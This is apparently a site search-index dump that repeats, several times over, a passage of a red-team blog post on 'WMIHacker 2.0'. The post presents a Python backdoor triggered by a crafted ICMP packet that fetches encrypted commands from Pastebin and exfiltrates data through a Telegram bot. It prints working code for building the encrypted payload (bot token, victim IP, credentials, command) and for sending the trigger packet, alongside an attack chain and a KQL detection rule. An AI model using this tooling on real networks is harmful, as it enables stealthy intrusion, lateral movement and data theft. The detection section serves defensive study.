C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nVICTIM HOST:\npython wmihacker.py \u0026lt;LOCAL IP\u0026gt; The attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nVICTIM HOST:\npython wmihacker.py \u0026lt;LOCAL IP\u0026gt; The attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nVICTIM HOST:\npython wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nVICTIM HOST:\npython wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\n![WMIHACKER CHAIN](/chain_wmihacker.png) The attack chain might look this way: 1. Initial access on a client machine via spear-phishing (T1566.001). 2. That machine sends a specially crafted packet to an internal Exchange server (already compromised). 3. The Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047). 4. Collected data is sent to a completely separate, hidden C2 server. As I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. ## Detection \u0026amp; Response \u0026gt;Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026#39;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise. To detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used: `winlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026#34;S-1-5-20\u0026#34;` Explanation: - event.code: 4688 â€“ Triggers on the creation of a new process. - winlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution. - SubjectUserSid: \u0026#34;S-1-5-20\u0026#34; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts. Response Actions: - Investigate the child process and command-line arguments. - Review associated WMI event logs and consumer/subscription configurations. - Correlate with other telemetry such as network connections or abnormal service creation. - Apply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors. ## Conclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts. When integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks. 